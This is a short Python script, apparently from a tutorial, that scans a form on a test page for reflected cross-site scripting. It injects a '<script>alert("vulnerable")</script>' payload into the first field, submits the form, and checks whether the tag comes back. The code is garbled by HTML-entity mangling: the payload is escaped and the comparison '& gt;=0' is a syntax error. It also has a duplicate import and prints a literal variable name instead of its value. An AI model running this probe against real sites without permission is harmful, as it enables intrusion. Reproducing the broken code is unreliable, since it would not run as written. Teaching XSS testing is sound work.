import requests
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup

request = requests.get("http://check.cyberpersons.com/crossSiteCheck.html")

parseHTML = BeautifulSoup(request.text, 'html.parser')

htmlForm = parseHTML.form

formName = htmlForm['name']

print("Form name: " + formName)

inputs = htmlForm.find_all('input')

inputFieldNames = []

for items in inputs:
    if items.has_attr('name'):
        inputFieldNames.append(items['name'])

print("inputFieldNames")

import mechanize

formSubmit = mechanize.Browser()

formSubmit.open("http://check.cyberpersons.com/crossSiteCheck.html")

formSubmit.select_form(formName)

payLoad = '&lt;script&gt;alert("vulnerable");&lt;/script&gt;'

# First field is always the payload, you can select anyfield for payload
# But that don't edit it later.

formSubmit.form[inputFieldNames[0]] = payLoad

for i in range(1, len(inputFieldNames)):
    formSubmit.form[inputFieldNames[i]] = "Customized text"

formSubmit.submit()

finalResult = formSubmit.response().read()

if finalResult.find('&lt;script&gt;') & gt;=0:
    print("Application is vulnerable")
else:
    print("You are in good hands")